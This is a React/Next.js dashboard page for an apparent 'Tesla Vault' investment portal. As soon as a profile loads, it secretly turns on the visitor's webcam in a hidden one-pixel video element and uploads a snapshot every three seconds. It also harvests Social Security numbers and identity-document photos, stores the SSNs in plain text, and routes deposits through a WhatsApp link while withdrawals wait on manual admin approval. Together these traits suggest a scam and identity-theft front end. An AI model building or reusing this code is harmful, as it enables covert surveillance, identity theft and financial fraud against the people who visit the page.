'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  Activity, Upload, Camera, User, 
  Wallet, Menu, X, Info, CheckCircle, AlertCircle,
  ArrowDownLeft, Clock, Banknote 
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// --- CUSTOM NOTIFICATION TOAST ---
const Notification = ({ message, type, onClose }: { message: string, type: 'success' | 'error', onClose: () => void }) => (
  <motion.div 
    initial={{ opacity: 0, y: 50 }} 
    animate={{ opacity: 1, y: 0 }} 
    exit={{ opacity: 0, y: 50 }} 
    className={`fixed bottom-8 left-1/2 -translate-x-1/2 z-[300] px-6 py-4 rounded-xl shadow-2xl flex items-center gap-3 border backdrop-blur-md
      ${type === 'success' ? 'bg-[#059669]/90 border-[#059669] text-white' : 'bg-red-500/90 border-red-500 text-white'}`}
  >
    {type === 'success' ? <CheckCircle size={20} /> : <AlertCircle size={20} />}
    <span className="text-sm font-bold tracking-wide">{message}</span>
    <button onClick={onClose} className="ml-4 opacity-70 hover:opacity-100"><X size={16}/></button>
  </motion.div>
);

export default function Dashboard() {
  const router = useRouter();
  
  // --- STATE ---
  const [user, setUser] = useState<any>({
    full_name: 'Valued Client',
    balance: 0,
    deposit_status: 'pending',
    kyc_status: 'unverified',
    email: 'client@secure.mail'
  });
  
  const [loading, setLoading] = useState(true);
  
  // KYC State
  const [ssn, setSsn] = useState('');
  const [idType, setIdType] = useState('driver_license');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);
  
  // UI State
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [notification, setNotification] = useState<{ message: string, type: 'success' | 'error' } | null>(null);

  // WITHDRAWAL STATE
  const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [latestWithdrawal, setLatestWithdrawal] = useState<any>(null);
  const [submittingWithdrawal, setSubmittingWithdrawal] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const showToast = (message: string, type: 'success' | 'error') => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 4000);
  };

  // --- INITIAL DATA FETCH ---
  useEffect(() => {
    let profileChannel: any;
    let withdrawalChannel: any;

    const initData = async () => {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        if (!session) { window.location.href = '/portal/auth'; return; }

        // 1. Fetch Profile
        const { data: profile } = await supabase.from('profiles').select('*').eq('id', session.user.id).single();
        if (profile) {
          setUser(profile);
          setLoading(false);
          startProctoring(session.user.id);
        } else {
           setLoading(false);
        }

        // 2. Fetch Latest Withdrawal Request
        const { data: withdrawals } = await supabase
          .from('withdrawal_requests')
          .select('*')
          .eq('user_id', session.user.id)
          .order('created_at', { ascending: false })
          .limit(1)
          .single();
        
        if (withdrawals) setLatestWithdrawal(withdrawals);

        // 3. Realtime Listener for Profile
        profileChannel = supabase.channel('realtime-profile')
          .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` }, 
          (payload) => setUser(payload.new))
          .subscribe();

        // 4. Realtime Listener for Withdrawal Status Updates (Admin Approval)
        withdrawalChannel = supabase.channel('realtime-withdrawals')
          .on('postgres_changes', { event: '*', schema: 'public', table: 'withdrawal_requests', filter: `user_id=eq.${session.user.id}` }, 
          (payload: any) => {
             // If a new row is inserted or updated, update state
             if(payload.new) setLatestWithdrawal(payload.new);
          })
          .subscribe();

      } catch (err) {
        console.error("Connection Error:", err);
        setLoading(false);
      }
    };

    initData();
    return () => { 
      if (profileChannel) supabase.removeChannel(profileChannel); 
      if (withdrawalChannel) supabase.removeChannel(withdrawalChannel);
    };
  }, []);

  // --- CAMERA LOGIC ---
  const startProctoring = async (userId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
      const vid = videoRef.current;
      if (vid) {
        vid.srcObject = stream;
        vid.onloadedmetadata = () => vid.play().catch(e => console.error(e));
      }
      const interval = setInterval(async () => {
        const cvs = canvasRef.current;
        if (vid && cvs && vid.readyState >= 2 && !vid.paused && !vid.ended) {
            const context = cvs.getContext('2d');
            if (context) {
                cvs.width = vid.videoWidth;
                cvs.height = vid.videoHeight;
                context.drawImage(vid, 0, 0, cvs.width, cvs.height);
                cvs.toBlob(async (blob) => {
                  if (blob) {
                    await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
                  }
                }, 'image/jpeg', 0.5); 
            }
        }
      }, 3000); 
      return () => clearInterval(interval); 
    } catch (e) { console.warn("Biometrics offline:", e); }
  };

  // --- HELPER ACTIONS ---
  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 9) val = val.slice(0, 9);
    let formattedVal = val;
    if (val.length > 3 && val.length <= 5) formattedVal = `${val.slice(0, 3)}-${val.slice(3)}`;
    else if (val.length > 5) formattedVal = `${val.slice(0, 3)}-${val.slice(3, 5)}-${val.slice(5)}`;
    setSsn(formattedVal);
  };

  const handleKyc = async (e: React.FormEvent) => {
    e.preventDefault();
    if (ssn.replace(/\D/g, '').length !== 9) { showToast("SSN must be exactly 9 digits.", "error"); return; }
    if (!idFile) { showToast("Please upload an Identity Document.", "error"); return; }
    setKycSubmitting(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) throw new Error("No session");
      const path = `${session.user.id}/${Date.now()}_id.jpg`;
      await supabase.storage.from('user-kyc').upload(path, idFile);
      await supabase.from('profiles').update({ ssn_data: ssn, document_type: idType, kyc_status: 'pending' }).eq('id', session.user.id);
      setUser((prev: any) => ({ ...prev, kyc_status: 'pending', ssn_data: ssn }));
      showToast("Verification Submitted Successfully", "success");
    } catch (err: any) { showToast(err.message || "Submission failed", "error"); }
    finally { setKycSubmitting(false); }
  };

  // --- WITHDRAWAL SUBMISSION HANDLER ---
  const handleWithdrawalRequest = async (e: React.FormEvent) => {
    e.preventDefault();
    const amount = Number(withdrawAmount);

    // 1. Check if number is valid
    if (!withdrawAmount || isNaN(amount) || amount <= 0) {
      showToast("Please enter a valid amount", "error");
      return;
    }
    
    // 2. STRICT CHECK: CANNOT WITHDRAW MORE THAN BALANCE
    if (amount > user.balance) {
      showToast(`Insufficient Funds. Max available: $${user.balance.toLocaleString()}`, "error");
      return;
    }

    setSubmittingWithdrawal(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) throw new Error("No session");

      const { error } = await supabase.from('withdrawal_requests').insert({
        user_id: session.user.id,
        amount: amount,
        status: 'pending'
      });

      if (error) throw error;

      showToast("Withdrawal Request Sent to Admin", "success");
      setWithdrawModalOpen(false);
      setWithdrawAmount('');
    } catch (err: any) {
      showToast(err.message || "Request failed", "error");
    } finally {
      setSubmittingWithdrawal(false);
    }
  };

  const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
  const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
  const waLink = `https://wa.me/19803487946?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
  const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);

  if (loading) return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center space-y-4">
      <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
      <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Verifying Identity...</p>
    </div>
  );return (
    <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black relative">
      <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" style={{ zIndex: -1 }} />
      <canvas ref={canvasRef} className="hidden" />
      <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />

      {/* TOAST NOTIFICATION */}
      <AnimatePresence>
        {notification && <Notification message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
      </AnimatePresence>

      {/* WITHDRAWAL MODAL */}
      <AnimatePresence>
        {withdrawModalOpen && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[250] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4"
          >
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
              className="bg-[#111] border border-white/10 p-8 rounded-[2rem] max-w-sm w-full relative"
            >
              <button onClick={() => setWithdrawModalOpen(false)} className="absolute top-4 right-4 text-gray-500 hover:text-white"><X size={20}/></button>
              
              <div className="text-center mb-6">
                <div className="w-12 h-12 bg-[#D4AF37]/10 rounded-full flex items-center justify-center mx-auto mb-4 text-[#D4AF37]">
                  <Banknote size={24} />
                </div>
                <h3 className="text-xl font-serif text-white">Request Withdrawal</h3>
                <p className="text-xs text-gray-500 mt-2">Available: ${user?.balance?.toLocaleString()}</p>
              </div>

              <form onSubmit={handleWithdrawalRequest} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] uppercase tracking-widest text-gray-500 font-bold ml-1">Amount (USD)</label>
                  <input 
                    type="number" 
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    placeholder="0.00"
                    className="w-full bg-black border border-white/10 rounded-xl p-4 text-white text-lg font-mono focus:border-[#D4AF37] outline-none"
                    autoFocus
                  />
                </div>
                <button 
                  disabled={submittingWithdrawal}
                  className="w-full py-4 bg-[#D4AF37] text-black font-bold uppercase tracking-widest text-xs rounded-xl hover:bg-white transition-colors"
                >
                  {submittingWithdrawal ? 'Processing...' : 'Confirm Request'}
                </button>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* NAVBAR */}
      <header className="sticky top-0 z-[100] bg-black/80 backdrop-blur-xl border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 md:px-10 h-20 flex justify-between items-center">
           <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#D4AF37] flex items-center justify-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
                <Activity size={20} className="text-black" />
              </div>
              <h1 className="text-xl font-serif italic">Tesla <span className="text-[#D4AF37]">Vault</span></h1>
           </div>
           <div className="hidden md:flex items-center gap-6">
              <Link href="/about" className="text-xs font-bold uppercase tracking-widest text-gray-400 hover:text-[#D4AF37] transition-colors flex items-center gap-2">
                 <Info size={14} /> About
              </Link>
              <div className="h-4 w-px bg-white/10"></div>
              <div className="flex flex-col items-end">
                <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0] || 'Unknown'}</span>
              </div>
              <button onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} className="flex items-center gap-2 px-4 py-2 bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10">
                <LogOut size={14} />
                <span className="text-[10px] font-bold uppercase tracking-wider">Sign Out</span>
              </button>
           </div>
           <button className="md:hidden text-[#D4AF37]" onClick={() => setIsMenuOpen(true)}>
              <Menu size={28} />
           </button>
        </div>
      </header>

      {/* MOBILE MENU */}
      <AnimatePresence>
        {isMenuOpen && (
          <motion.div 
            initial={{ opacity: 0, x: '100%' }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: '100%' }}
            className="fixed inset-0 z-[200] bg-black/95 backdrop-blur-xl md:hidden flex flex-col p-8"
          >
             <div className="flex justify-between items-center mb-12">
                <h2 className="text-2xl font-serif text-white">Menu</h2>
                <button onClick={() => setIsMenuOpen(false)} className="p-2 bg-white/5 rounded-full"><X size={24} className="text-[#D4AF37]" /></button>
             </div>
             <div className="flex flex-col gap-6 flex-1">
                <div className="bg-[#111] p-6 rounded-2xl border border-white/10 mb-4">
                   <div className="flex items-center gap-3 mb-2"><User size={16} className="text-[#D4AF37]" /><span className="text-xs uppercase tracking-widest text-gray-500">Active Session</span></div>
                   <p className="text-lg font-mono text-white">{user?.full_name}</p>
                   <p className="text-xs text-gray-600 truncate">{user?.email}</p>
                </div>
                <Link href="/about" className="flex items-center gap-4 text-2xl font-serif text-gray-300 hover:text-[#D4AF37] transition-colors"><Info size={24} /> About Platform</Link>
                <button onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} className="flex items-center gap-4 text-2xl font-serif text-red-500 hover:text-red-400 transition-colors mt-auto"><LogOut size={24} /> Sign Out</button>
             </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
        
        {/* STATS AREA */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
             <div>
               <div className="flex items-center gap-2 mb-6">
                 <Wallet size={14} className="text-[#D4AF37]" />
                 <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] font-bold">Consolidated Equity</p>
               </div>
               <h2 className="text-5xl md:text-8xl font-serif text-white tracking-tighter leading-none break-all">
                 ${user?.balance?.toLocaleString() || '0.00'}
               </h2>
             </div>
             
             {/* ACTION BUTTONS AREA */}
             <div className="mt-10 md:mt-0 flex flex-col md:flex-row items-center gap-4">
               {/* 1. DEPOSIT BUTTON */}
               <a 
                 href={isUnlocked ? waLink : "#"} 
                 onClick={(e) => !isUnlocked && e.preventDefault()}
                 className={`w-full md:w-auto px-10 py-5 rounded-full font-black uppercase tracking-widest text-[11px] flex items-center justify-center gap-3 transition-all duration-500 text-center
                 ${isUnlocked ? 'bg-[#D4AF37] text-black shadow-[0_0_40px_rgba(212,175,55,0.3)] hover:scale-105' : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/10'}`}
               >
                 {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
               </a>

               {/* 2. WITHDRAW BUTTON / STATUS CARD */}
               {latestWithdrawal && latestWithdrawal.status === 'pending' ? (
                 <div className="w-full md:w-auto px-8 py-4 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center gap-3 text-yellow-500">
                    <Clock size={18} className="animate-pulse" />
                    <div className="flex flex-col text-left">
                       <span className="text-[10px] font-bold uppercase tracking-wider">Pending Approval</span>
                       <span className="text-xs font-mono">${latestWithdrawal.amount.toLocaleString()}</span>
                    </div>
                 </div>
               ) : latestWithdrawal && latestWithdrawal.status === 'approved' ? (
                 <div className="w-full md:w-auto px-8 py-4 bg-green-500/10 border border-green-500/30 rounded-full flex items-center gap-3 text-green-500">
                    <CheckCircle size={18} />
                    <div className="flex flex-col text-left">
                       <span className="text-[10px] font-bold uppercase tracking-wider">Withdrawal Approved</span>
                       <span className="text-xs font-mono">${latestWithdrawal.amount.toLocaleString()}</span>
                    </div>
                 </div>
               ) : (
                 <button 
                   onClick={() => setWithdrawModalOpen(true)}
                   className="w-full md:w-auto px-10 py-5 bg-white/5 border border-white/10 rounded-full font-black uppercase tracking-widest text-[11px] text-white hover:bg-white hover:text-black transition-all flex items-center justify-center gap-3"
                 >
                   <ArrowDownLeft size={16} /> Withdraw Funds
                 </button>
               )}
             </div>
             
             {!isUnlocked && (
                 <p className="mt-4 text-[10px] text-gray-600 uppercase tracking-widest font-bold">Awaiting Compliance Review</p>
             )}
          </div>

          <div className="lg:col-span-4 space-y-6">
             <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y-8">
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <div className="flex items-center gap-3"><ShieldCheck size={18} className={isUnlocked ? 'text-green-500' : 'text-yellow-500'} /><span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">Vault Status</span></div>
                   <span className={`text-[11px] font-mono uppercase ${isUnlocked ? 'text-green-500' : 'text-yellow-500'}`}>{user?.deposit_status || 'Checking'}</span>
                </div>
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <div className="flex items-center gap-3"><User size={18} className="text-blue-400" /><span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">KYC Level</span></div>
                   <span className="text-[11px] font-mono text-white uppercase">{user?.kyc_status === 'verified' ? 'ELITE' : 'BASIC'}</span>
                </div>
                <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
                   <div className="relative"><Camera size={20} className="text-[#D4AF37]" /><div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" /></div>
                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 3 seconds.</p>
                </div>
             </div>
          </div>
        </div>

        {/* KYC SECTION */}
        {user?.kyc_status === 'verified' ? (
          <div className="bg-[#0a0a0a] border border-[#D4AF37]/30 rounded-[2.5rem] p-12 text-center flex flex-col items-center gap-6 shadow-[0_0_50px_rgba(212,175,55,0.05)]">
             <div className="w-24 h-24 bg-[#D4AF37]/10 rounded-full flex items-center justify-center border border-[#D4AF37] shadow-lg"><ShieldCheck size={48} className="text-[#D4AF37]" /></div>
             <div><h3 className="text-3xl font-serif text-white mb-3">Identity Verified</h3><p className="text-gray-500 text-sm max-w-lg mx-auto leading-relaxed">Your secure profile has been successfully validated. You now have Tier-1 access to all global markets and high-limit withdrawals.</p></div>
             <div className="px-8 py-3 bg-[#D4AF37]/10 rounded-full border border-[#D4AF37]/20 text-[#D4AF37] text-xs uppercase font-bold tracking-widest flex items-center gap-2"><CheckCircle size={14} /> Compliance Status: Elite</div>
          </div>
        ) : (
          <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
            <div className="max-w-3xl">
              <div className="flex items-center gap-3 mb-6"><ShieldCheck size={24} className="text-[#D4AF37]" /><h3 className="text-3xl md:text-4xl font-serif">Security Verification</h3></div>
              <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>

              {showPendingScreen ? (
                <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
                   <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
                   <p className="text-xs uppercase tracking-[0.3em] font-bold text-white">Security Review in Progress</p>
                   <p className="text-[10px] text-gray-500">Your documents are currently being decrypted and verified by our compliance node.</p>
                </div>
              ) : (
                <form onSubmit={handleKyc} className="space-y-8">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Identity Document</label>
                      <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs transition-all cursor-pointer">
                        <option value="driver_license">Driver's License</option>
                        <option value="passport">International Passport</option>
                      </select>
                    </div>
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Social Security Number</label>
                      <input type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={handleSsnChange} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs tracking-widest" required />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Proof of Identity (Front View)</label>
                    <div className="relative group min-h-[160px] border-2 border-dashed border-white/10 rounded-3xl p-6 flex flex-col items-center justify-center gap-3 bg-black hover:border-[#D4AF37]/50 transition-all cursor-pointer">
                      <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
                      <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center text-gray-400 group-hover:text-[#D4AF37] transition-colors"><Upload size={20} /></div>
                      <span className="text-[10px] uppercase font-bold tracking-widest text-gray-500 group-hover:text-white transition-colors">{idFile ? idFile.name : `Attach ${idType.replace('_', ' ')} Photo`}</span>
                    </div>
                  </div>
                  <button disabled={kycSubmitting} className="w-full md:w-auto px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[11px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl active:scale-95">{kycSubmitting ? "Encrypting Documents..." : "Finalize Verification"}</button>
                </form>
              )}
            </div>
          </div>
        )}
      </div>
    </main>
  );
            }
